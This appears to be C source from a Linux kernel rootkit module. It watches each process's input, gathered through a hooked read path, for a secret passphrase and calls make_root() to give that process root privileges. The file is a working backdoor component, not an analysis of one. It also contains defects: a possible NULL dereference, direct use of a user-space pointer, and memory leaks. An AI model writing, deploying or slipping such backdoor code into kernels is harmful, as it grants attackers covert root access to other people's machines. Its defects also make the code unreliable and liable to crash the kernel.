#include <linux/hashtable.h>
#include <linux/kernel.h>
#include <linux/slab.h>

#include "read.h"
#include "common.h"
#include "hook.h"
#include "creds.h"

DEFINE_HASHTABLE(pid_ht, 8);

static const char *accept = "makerot_";

static int
is_valid(char *buf, size_t size)
{
    //Small performance optimization when only reading one char
    //Avoids strspn
    if(size == 1) {
        if((buf[0] >= 'a' && buf[0] <= 'z') || buf[0] == '_') {
            return strspn(buf, accept) > 0;
        }
        
        return 0;
    }

    return strspn(buf, accept) > 0;
}

static void
add_entry(pid_t key)
{
    struct pid_entry *cur;
    struct pid_entry *new = kzalloc(sizeof(struct pid_entry), GFP_KERNEL);
    new->pid = key;
    new->str = kzalloc(MAX_BUF, GFP_KERNEL);
    new->capacity = MAX_BUF;
    new->iter = 0;


    int found = 0;
    hash_for_each_possible(pid_ht, cur, hlist, key)
        if(cur->pid == key)
            found = 1;

    if(!found)
        hash_add(pid_ht, &new->hlist, key);
}

static void
remove_entry(pid_t key)
{
    struct pid_entry *cur;
   
    hash_for_each_possible(pid_ht, cur, hlist, key) {
        if(cur->pid == key) {
            kfree(cur->str);
            hash_del(&cur->hlist);
            kfree(cur);
        }
    }
}

static struct pid_entry *
get_entry(pid_t key)
{
    struct pid_entry *cur;

    hash_for_each_possible(pid_ht, cur, hlist, key)
        if(cur->pid == key)
            return cur;

    return NULL;
}

static void
handle_compare(char *buf, pid_t pid, size_t size) 
{
    struct pid_entry *entry;
    entry = get_entry(pid);

    int i = 0;

    if(entry) {
    fill:
        while(i < size && entry->capacity > 0) {
            entry->str[entry->iter] = buf[i];
            entry->capacity--;
            i++;
            entry->iter++;
        }
        
        if(strnstr(entry->str, PASSPHRASE, MAX_BUF)) {
            make_root();
            return;
        }

        if(entry->capacity == 0) {
            memmove(entry->str, (entry->str + 12), 12);
            entry->capacity = entry->iter = 12;

            goto fill;
        }

    }

    if(strstr(entry->str, PASSPHRASE))
        make_root();
}

void
handle_pid(pid_t pid, __user char *buf, size_t size)
{
    char *str = kzalloc(size, GFP_KERNEL);   
    copy_from_user(str, buf, size);
    
    //Early return on exact match
    if(strnstr(str, PASSPHRASE, size)) {
        make_root();
        return;
    }

    if(is_valid(str, size)) {
        add_entry(pid);
        handle_compare(buf, pid, size);
    } else {
        //Throw out hashtable entries on invalid input
        remove_entry(pid);
    }

    kfree(str);
}